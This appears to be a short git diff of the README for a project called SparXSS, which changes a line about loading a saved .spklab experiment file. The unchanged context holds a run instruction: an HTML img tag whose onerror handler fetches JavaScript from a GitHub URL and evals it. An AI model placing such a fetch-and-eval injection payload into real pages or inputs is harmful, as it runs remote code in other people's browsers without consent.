@@ -5,7 +5,7 @@ Run it using:
 <img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
 ```
 
-Or Download The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App
+Or Download The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App - this might not be fully up to date, so don't rely on it from here
 
 ## ToDo
 - ~~Make Icon's Show up for Every URL~~
